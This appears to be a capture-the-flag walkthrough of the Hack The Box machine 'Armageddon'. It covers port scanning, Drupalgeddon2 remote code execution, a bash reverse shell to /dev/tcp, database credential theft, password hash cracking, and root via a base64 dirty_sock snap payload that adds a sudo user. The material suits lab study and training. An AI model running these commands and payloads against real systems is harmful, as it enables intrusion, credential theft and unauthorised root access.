I"Z<h1 id="masscan--nmap">Masscan + Nmap</h1>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
</pre></td><td class="rouge-code"><pre><span class="nv">$ </span>masscan <span class="nt">-p1-65535</span>,U:1-65535 10.10.10.233 <span class="nt">--rate</span><span class="o">=</span>10000 <span class="nt">-e</span> tun0 | <span class="nb">tee </span>masscan.out

Starting masscan 1.0.5 <span class="o">(</span>http://bit.ly/14GZzcT<span class="o">)</span> at 2021-07-03 11:03:35 GMT
 <span class="nt">--</span> forced options: <span class="nt">-sS</span> <span class="nt">-Pn</span> <span class="nt">-n</span> <span class="nt">--randomize-hosts</span> <span class="nt">-v</span> <span class="nt">--send-eth</span>
Initiating SYN Stealth Scan
Scanning 1 hosts <span class="o">[</span>131070 ports/host]
Discovered open port 22/tcp on 10.10.10.233
Discovered open port 80/tcp on 10.10.10.233
</pre></td></tr></tbody></table></code></pre></div></div>
<p>Parse those ports to nmap:</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
</pre></td><td class="rouge-code"><pre><span class="nv">$ ports</span><span class="o">=</span><span class="si">$(</span><span class="nb">cat </span>masscan.out |awk <span class="s1">'{ print $4 }'</span> | <span class="nb">sed</span> <span class="s1">'s/\/tcp//'</span> | <span class="nb">tr</span> <span class="s1">'\n'</span> <span class="s1">','</span> | <span class="nb">sed</span> <span class="s1">'s/,$//'</span><span class="si">)</span>
<span class="nv">$ </span>nmap <span class="nt">-sVC</span>  <span class="nt">--min-rate</span> 1000 <span class="nt">-p</span> <span class="nv">$ports</span> 10.10.10.233 <span class="nt">-oN</span> nmap-fullscan.out
Starting Nmap 7.91 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2021-07-03 16:34 IST
Nmap scan report <span class="k">for </span>10.10.10.233
Host is up <span class="o">(</span>0.088s latency<span class="o">)</span><span class="nb">.</span>

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.4 <span class="o">(</span>protocol 2.0<span class="o">)</span>
| ssh-hostkey:
|   2048 82:c6:bb:c7:02:6a:93:bb:7c:cb:dd:9c:30:93:79:34 <span class="o">(</span>RSA<span class="o">)</span>
|   256 3a:ca:95:30:f3:12:d7:ca:45:05:bc:c7:f1:16:bb:fc <span class="o">(</span>ECDSA<span class="o">)</span>
|_  256 7a:d4:b3:68:79:cf:62:8a:7d:5a:61:e7:06:0f:5f:33 <span class="o">(</span>ED25519<span class="o">)</span>
80/tcp open  http    Apache httpd 2.4.6 <span class="o">((</span>CentOS<span class="o">)</span> PHP/5.4.16<span class="o">)</span>
|_http-generator: Drupal 7 <span class="o">(</span>http://drupal.org<span class="o">)</span>
| http-robots.txt: 36 disallowed entries <span class="o">(</span>15 shown<span class="o">)</span>
| /includes/ /misc/ /modules/ /profiles/ /scripts/
| /themes/ /CHANGELOG.txt /cron.php /INSTALL.mysql.txt
| /INSTALL.pgsql.txt /INSTALL.sqlite.txt /install.php /INSTALL.txt
|_/LICENSE.txt /MAINTAINERS.txt
|_http-server-header: Apache/2.4.6 <span class="o">(</span>CentOS<span class="o">)</span> PHP/5.4.16
|_http-title: Welcome to  Armageddon |  Armageddon
</pre></td></tr></tbody></table></code></pre></div></div>
<h1 id="http-port-80">HTTP (Port-80)</h1>
<ul>
  <li>Greets with a message “Welcome to Armageddon” and a login page.</li>
</ul>

<p><img src="/assets/img/Posts/Armageddon/armageddon-1.png" alt="armageddon-1.png" /></p>

<ul>
  <li>Source code to the home page reveals Drupal 7 running.
    <div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre></td><td class="rouge-code"><pre>  <span class="nt">&lt;meta</span> <span class="na">name=</span><span class="s">"Generator"</span> <span class="na">content=</span><span class="s">"Drupal 7 (http://drupal.org)"</span> <span class="nt">/&gt;</span>
</pre></td></tr></tbody></table></code></pre></div>    </div>
    <p><code class="language-plaintext highlighter-rouge">/CHANGELOG.txt</code> shows version as <code class="language-plaintext highlighter-rouge">Drupal 7.56</code>.</p>
  </li>
  <li>There are some files in robots.txt file which do not contain much sensitive information.
    <h1 id="foothold">Foothold</h1>
    <p>Finding exploits for Drupal 7 gives:</p>
    <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
</pre></td><td class="rouge-code"><pre><span class="nv">$ </span>searchsploit drupal 7.56
<span class="nt">---------------------------------------------------------------------------------------------</span> <span class="nt">------------------------</span>
 Exploit Title                                                                               |  Path
<span class="nt">---------------------------------------------------------------------------------------------</span> <span class="nt">------------------------</span>
Drupal &lt; 7.58 - <span class="s1">'Drupalgeddon3'</span> <span class="o">(</span>Authenticated<span class="o">)</span> Remote Code <span class="o">(</span>Metasploit<span class="o">)</span>                     | php/webapps/44557.rb
Drupal &lt; 7.58 - <span class="s1">'Drupalgeddon3'</span> <span class="o">(</span>Authenticated<span class="o">)</span> Remote Code Execution <span class="o">(</span>PoC<span class="o">)</span>                  | php/webapps/44542.txt
Drupal &lt; 7.58 / &lt; 8.3.9 / &lt; 8.4.6 / &lt; 8.5.1 - <span class="s1">'Drupalgeddon2'</span> Remote Code Execution          | php/webapps/44449.rb
Drupal &lt; 8.3.9 / &lt; 8.4.6 / &lt; 8.5.1 - <span class="s1">'Drupalgeddon2'</span> Remote Code Execution <span class="o">(</span>Metasploit<span class="o">)</span>      | php/remote/44482.rb
Drupal &lt; 8.3.9 / &lt; 8.4.6 / &lt; 8.5.1 - <span class="s1">'Drupalgeddon2'</span> Remote Code Execution <span class="o">(</span>PoC<span class="o">)</span>             | php/webapps/44448.py
Drupal &lt; 8.6.10 - RESTful Web Services unserialize<span class="o">()</span> Remote Command Execution <span class="o">(</span>Metasploit<span class="o">)</span>   | php/remote/46510.rb
Drupal &lt; 8.6.10 / &lt; 8.5.11 - REST Module Remote Code Execution                               | php/webapps/46452.txt
Drupal &lt; 8.6.9 - REST Module Remote Code Execution                                           | php/webapps/46459.py
<span class="nt">-----------------------------</span> <span class="nt">----------------------------------------------------------------------------------------</span>
Shellcodes: No Results
</pre></td></tr></tbody></table></code></pre></div>    </div>
    <p>Here’s a exploit for Drupal 7.x for Drupalgeddon 2 Forms API Property Injection: https://github.com/FireFart/CVE-2018-7600</p>
    <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
</pre></td><td class="rouge-code"><pre><span class="nv">$ </span>python poc.py
<span class="nv">uid</span><span class="o">=</span>48<span class="o">(</span>apache<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>48<span class="o">(</span>apache<span class="o">)</span> <span class="nb">groups</span><span class="o">=</span>48<span class="o">(</span>apache<span class="o">)</span> <span class="nv">context</span><span class="o">=</span>system_u:system_r:httpd_t:s0
<span class="o">[{</span><span class="s2">"command"</span>:<span class="s2">"settings"</span>,<span class="s2">"settings"</span>:<span class="o">{</span><span class="s2">"basePath"</span>:<span class="s2">"</span><span class="se">\/</span><span class="s2">"</span>,<span class="s2">"pathPrefix"</span>:<span class="s2">""</span>,<span class="s2">"ajaxPageState"</span>:<span class="o">{</span><span class="s2">"theme"</span>:<span class="s2">"bartik"</span>,<span class="s2">"theme_token"</span>:<span class="s2">"XlrWqA3Z7R7kRCGdc5hw-K6Ss48UaX4u6gO2Rr1XWm8"</span><span class="o">}}</span>,<span class="s2">"merge"</span>:true<span class="o">}</span>,<span class="o">{</span><span class="s2">"command"</span>:<span class="s2">"insert"</span>,<span class="s2">"method"</span>:<span class="s2">"replaceWith"</span>,<span class="s2">"selector"</span>:null,<span class="s2">"data"</span>:<span class="s2">""</span>,<span class="s2">"settings"</span>:<span class="o">{</span><span class="s2">"basePath"</span>:<span class="s2">"</span><span class="se">\/</span><span class="s2">"</span>,<span class="s2">"pathPrefix"</span>:<span class="s2">""</span>,<span class="s2">"ajaxPageState"</span>:<span class="o">{</span><span class="s2">"theme"</span>:<span class="s2">"bartik"</span>,<span class="s2">"theme_token"</span>:<span class="s2">"XlrWqA3Z7R7kRCGdc5hw-K6Ss48UaX4u6gO2Rr1XWm8"</span><span class="o">}}}]</span>
</pre></td></tr></tbody></table></code></pre></div>    </div>
    <p>Using a bash reverse shell payload : <code class="language-plaintext highlighter-rouge">bash -i &gt;&amp; /dev/tcp/10.10.14.25/4444 0&gt;&amp;1</code> we get a rev-shell.
```bash
$ rlwrap nc -lnp 4444
Connection received on 10.10.10.233 34874
bash: no job control in this shell</p>
  </li>
</ul>

<p>bash-4.2$ whoami
apache</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
</pre></td><td class="rouge-code"><pre>## MySQL 
```bash
bash-4.2$ cat /var/www/html/sites/default/settings.php
							[..snip..]
$databases = array (
  'default' =&gt;
  array (
    'default' =&gt;
    array (
      'database' =&gt; 'drupal',
      'username' =&gt; 'drupaluser',
      'password' =&gt; 'CQHEy@9M*m23gBVj',
      'host' =&gt; 'localhost',
      'port' =&gt; '',
      'driver' =&gt; 'mysql',
      'prefix' =&gt; '',
    ),
  ),
);
							[..snip..]
</pre></td></tr></tbody></table></code></pre></div></div>
<p>Dumping MySQL database and getting username and password:</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
</pre></td><td class="rouge-code"><pre>bash-4.2<span class="nv">$ </span>mysql <span class="nt">-u</span> drupaluser <span class="nt">-p</span><span class="s1">'CQHEy@9M*m23gBVj'</span> <span class="nt">-e</span> <span class="s1">'show databases;'</span>
Database
information_schema
drupal
mysql
performance_schema

bash-4.2<span class="nv">$ </span>mysql <span class="nt">-u</span> drupaluser <span class="nt">-p</span><span class="s1">'CQHEy@9M*m23gBVj'</span> <span class="nt">-e</span> <span class="s1">'use drupal; show tables;'</span>
Tables_in_drupal
actions
authmap
batch
block
<span class="o">[</span>..snip..]
<span class="nb">users
</span>users_roles
variable
watchdog

bash-4.2<span class="nv">$ </span>mysql <span class="nt">-u</span> drupaluser <span class="nt">-p</span><span class="s1">'CQHEy@9M*m23gBVj'</span> <span class="nt">-e</span> <span class="s1">'select name,pass from drupal.users;'</span>
name    pass

brucetherealadmin       <span class="nv">$S$DgL2gjv6ZtxBo6CdqZEyJuBphBmrCqIV6W97</span>.oOsUf1xAhaadURt
<span class="nb">test</span>    <span class="nv">$S$DXHwkzIHfP</span>.u9NPIUSeKhG/D4ICsQQVai1wZCSNGWsyqnzuXXHOZ
htb     <span class="nv">$S$DX3</span>/RE6IlgxLBA32tTpcbBh7DIf32hnOKEzTPql47523uOG3gIT0
</pre></td></tr></tbody></table></code></pre></div></div>
<p>Hash cracking with john gives <code class="language-plaintext highlighter-rouge">brucetherealadmin:booboo</code> as credentials:</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
</pre></td><td class="rouge-code"><pre><span class="c"># john hashes -w:/usr/share/wordlists/rockyou.txt</span>
Using default input encoding: UTF-8
Loaded 1 password <span class="nb">hash</span> <span class="o">(</span>Drupal7, <span class="nv">$S$ </span><span class="o">[</span>SHA512 256/256 AVX2 4x]<span class="o">)</span>
Cost 1 <span class="o">(</span>iteration count<span class="o">)</span> is 32768 <span class="k">for </span>all loaded hashes
Will run 2 OpenMP threads
Press <span class="s1">'q'</span> or Ctrl-C to abort, almost any other key <span class="k">for </span>status
booboo           <span class="o">(</span>?<span class="o">)</span>
1g 0:00:00:00 DONE <span class="o">(</span>2021-07-03 17:41<span class="o">)</span> 9.090g/s 72.72p/s 72.72c/s 72.72C/s booboo..honey
Use the <span class="s2">"--show"</span> option to display all of the cracked passwords reliably
Session completed
</pre></td></tr></tbody></table></code></pre></div></div>
<p>We can login via SSH onto the box:</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
</pre></td><td class="rouge-code"><pre><span class="nv">$ </span>ssh brucetherealadmin@10.10.10.233
The authenticity of host <span class="s1">'10.10.10.233 (10.10.10.233)'</span> can<span class="s1">'t be established.
ECDSA key fingerprint is SHA256:bC1R/FE5sI72ndY92lFyZQt4g1VJoSNKOeAkuuRr4Ao.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '</span>10.10.10.233<span class="s1">' (ECDSA) to the list of known hosts.
brucetherealadmin@10.10.10.233'</span>s password:
Last login: Sat Jul  3 12:55:51 2021 from 10.10.14.57
<span class="o">[</span>brucetherealadmin@armageddon ~]<span class="err">$</span>
</pre></td></tr></tbody></table></code></pre></div></div>
<h1 id="privesc">Privesc</h1>
<p>Checking for any sudo permissions available:</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
</pre></td><td class="rouge-code"><pre><span class="o">[</span>brucetherealadmin@armageddon ~]<span class="nv">$ </span><span class="nb">sudo</span> <span class="nt">-l</span>
Matching Defaults entries <span class="k">for </span>brucetherealadmin on armageddon:
    <span class="o">!</span>visiblepw, always_set_home, match_group_by_gid, always_query_group_plugin, env_reset,
    <span class="nv">env_keep</span><span class="o">=</span><span class="s2">"COLORS DISPLAY HOSTNAME HISTSIZE KDEDIR LS_COLORS"</span>, env_keep+<span class="o">=</span><span class="s2">"MAIL PS1 PS2 QTDIR USERNAME
    LANG LC_ADDRESS LC_CTYPE"</span>, env_keep+<span class="o">=</span><span class="s2">"LC_COLLATE LC_IDENTIFICATION LC_MEASUREMENT LC_MESSAGES"</span>,
    env_keep+<span class="o">=</span><span class="s2">"LC_MONETARY LC_NAME LC_NUMERIC LC_PAPER LC_TELEPHONE"</span>, env_keep+<span class="o">=</span><span class="s2">"LC_TIME LC_ALL LANGUAGE
    LINGUAS _XKB_CHARSET XAUTHORITY"</span>, <span class="nv">secure_path</span><span class="o">=</span>/sbin<span class="se">\:</span>/bin<span class="se">\:</span>/usr/sbin<span class="se">\:</span>/usr/bin

User brucetherealadmin may run the following commands on armageddon:
    <span class="o">(</span>root<span class="o">)</span> NOPASSWD: /usr/bin/snap <span class="nb">install</span> <span class="k">*</span>
</pre></td></tr></tbody></table></code></pre></div></div>
<p>Which means we can install any .snap file as root.
Googling <em>“Create malicious snap github”</em> gives: https://github.com/initstring/dirty_sock</p>

<blockquote>
  <p><em>“Ubuntu comes with snapd by default, but any distribution should be exploitable if they have this package installed. You can easily check if your system is vulnerable. Run the command below. If your snapd is 2.37.1 or newer, you are safe.”</em></p>
</blockquote>

<p>Since Dirty Sock v2 works locally we can focus on that: https://raw.githubusercontent.com/initstring/dirty_sock/master/dirty_sockv2.py</p>

<h2 id="creating-malicious-snap">Creating malicious snap</h2>
<p>dirty_sockv2.py has a variable called TROJAN_SNAP which stores the malicious snap.</p>

<blockquote>
  <p><em>“The following global is a base64 encoded string representing an installable snap package. The snap itself is empty and has no functionality. It does, however, have a bash-script in the install hook that will create a new user.”</em></p>
</blockquote>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre></td><td class="rouge-code"><pre><span class="o">[</span>brucetherealadmin@armageddon ~]<span class="nv">$ </span>python3 <span class="nt">-c</span> <span class="s2">"print('aHNxcwcAAAAQIVZcAAACAAAAAAAEABEA0AIBAAQAAADgAAAAAAAAAI4DAAAAAAAAhgMAAAAAAAD//////////xICAAAAAAAAsAIAAAAAAAA+AwAAAAAAAHgDAAAAAAAAIyEvYmluL2Jhc2gKCnVzZXJhZGQgZGlydHlfc29jayAtbSAtcCAnJDYkc1daY1cxdDI1cGZVZEJ1WCRqV2pFWlFGMnpGU2Z5R3k5TGJ2RzN2Rnp6SFJqWGZCWUswU09HZk1EMXNMeWFTOTdBd25KVXM3Z0RDWS5mZzE5TnMzSndSZERoT2NFbURwQlZsRjltLicgLXMgL2Jpbi9iYXNoCnVzZXJtb2QgLWFHIHN1ZG8gZGlydHlfc29jawplY2hvICJkaXJ0eV9zb2NrICAgIEFMTD0oQUxMOkFMTCkgQUxMIiA+PiAvZXRjL3N1ZG9lcnMKbmFtZTogZGlydHktc29jawp2ZXJzaW9uOiAnMC4xJwpzdW1tYXJ5OiBFbXB0eSBzbmFwLCB1c2VkIGZvciBleHBsb2l0CmRlc2NyaXB0aW9uOiAnU2VlIGh0dHBzOi8vZ2l0aHViLmNvbS9pbml0c3RyaW5nL2RpcnR5X3NvY2sKCiAgJwphcmNoaXRlY3R1cmVzOgotIGFtZDY0CmNvbmZpbmVtZW50OiBkZXZtb2RlCmdyYWRlOiBkZXZlbAqcAP03elhaAAABaSLeNgPAZIACIQECAAAAADopyIngAP8AXF0ABIAerFoU8J/e5+qumvhFkbY5Pr4ba1mk4+lgZFHaUvoa1O5k6KmvF3FqfKH62aluxOVeNQ7Z00lddaUjrkpxz0ET/XVLOZmGVXmojv/IHq2fZcc/VQCcVtsco6gAw76gWAABeIACAAAAaCPLPz4wDYsCAAAAAAFZWowA/Td6WFoAAAFpIt42A8BTnQEhAQIAAAAAvhLn0OAAnABLXQAAan87Em73BrVRGmIBM8q2XR9JLRjNEyz6lNkCjEjKrZZFBdDja9cJJGw1F0vtkyjZecTuAfMJX82806GjaLtEv4x1DNYWJ5N5RQAAAEDvGfMAAWedAQAAAPtvjkc+MA2LAgAAAAABWVo4gIAAAAAAAAAAPAAAAAAAAAAAAAAAAAAAAFwAAAAAAAAAwAAAAAAAAACgAAAAAAAAAOAAAAAAAAAAPgMAAAAAAAAEgAAAAACAAw'+ 'A' * 4256 + '==')"</span> | <span class="nb">base64</span> <span class="nt">-d</span> <span class="o">&gt;</span> mal.snap
</pre></td></tr></tbody></table></code></pre></div></div>

<p>Running with sudo gives error related to metatdata:</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre></td><td class="rouge-code"><pre><span class="o">[</span>brucetherealadmin@armageddon ~]<span class="nv">$ </span><span class="nb">sudo</span> /usr/bin/snap <span class="nb">install </span>mal.snap
error: cannot find signatures with metadata <span class="k">for </span>snap <span class="s2">"mal.snap"</span>
</pre></td></tr></tbody></table></code></pre></div></div>

<p>Viewing metadata shows the confinement is <code class="language-plaintext highlighter-rouge">devmode</code> , and after the payload runs it creates a user:<code class="language-plaintext highlighter-rouge">dirty_sock</code> password:<code class="language-plaintext highlighter-rouge">dirty_sock</code>, adds it to <code class="language-plaintext highlighter-rouge">sudo</code> group and gives all perms to <code class="language-plaintext highlighter-rouge">dirty_sock</code> user in /etc/sudoers.</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
</pre></td><td class="rouge-code"><pre>strings mal.snap
hsqs
<span class="c">#!/bin/bash</span>
useradd dirty_sock <span class="nt">-m</span> <span class="nt">-p</span> <span class="s1">'$6$sWZcW1t25pfUdBuX$jWjEZQF2zFSfyGy9LbvG3vFzzHRjXfBYK0SOGfMD1sLyaS97AwnJUs7gDCY.fg19Ns3JwRdDhOcEmDpBVlF9m.'</span> <span class="nt">-s</span> /bin/bash
usermod <span class="nt">-aG</span> <span class="nb">sudo </span>dirty_sock
<span class="nb">echo</span> <span class="s2">"dirty_sock    ALL=(ALL:ALL) ALL"</span> <span class="o">&gt;&gt;</span> /etc/sudoers
name: dirty-sock
version: <span class="s1">'0.1'</span>
summary: Empty snap, used <span class="k">for </span>exploit
description: <span class="s1">'See https://github.com/initstring/dirty_sock
architectures:
- amd64
confinement: devmode
grade: devel
7zXZ
7zXZ
        $l5
</span></pre></td></tr></tbody></table></code></pre></div></div>

<p>Running snap with –devmode flag:</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre></td><td class="rouge-code"><pre><span class="o">[</span>brucetherealadmin@armageddon ~]<span class="nv">$ </span><span class="nb">sudo</span> /usr/bin/snap <span class="nb">install </span>malicious.snap <span class="nt">--devmode</span>
dirty-sock 0.1 installed
</pre></td></tr></tbody></table></code></pre></div></div>

<p>Get root:</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
</pre></td><td class="rouge-code"><pre><span class="o">[</span>brucetherealadmin@armageddon ~]<span class="nv">$ </span><span class="nb">sudo </span>snap <span class="nb">install </span>mal.snap <span class="nt">--devmode</span>
dirty-sock 0.1 installed
<span class="o">[</span>brucetherealadmin@armageddon ~]<span class="nv">$ </span>su dirty_sock
Password:
<span class="o">[</span>dirty_sock@armageddon brucetherealadmin]<span class="nv">$ </span><span class="nb">sudo </span>su

We trust you have received the usual lecture from the <span class="nb">local </span>System
Administrator. It usually boils down to these three things:

    <span class="c">#1) Respect the privacy of others.</span>
    <span class="c">#2) Think before you type.</span>
    <span class="c">#3) With great power comes great responsibility.</span>

<span class="o">[</span><span class="nb">sudo</span><span class="o">]</span> password <span class="k">for </span>dirty_sock:
<span class="o">[</span>root@armageddon brucetherealadmin]# <span class="nb">whoami</span> <span class="o">&amp;&amp;</span> <span class="nb">hostname
</span>root
armageddon.htb
</pre></td></tr></tbody></table></code></pre></div></div>
:ET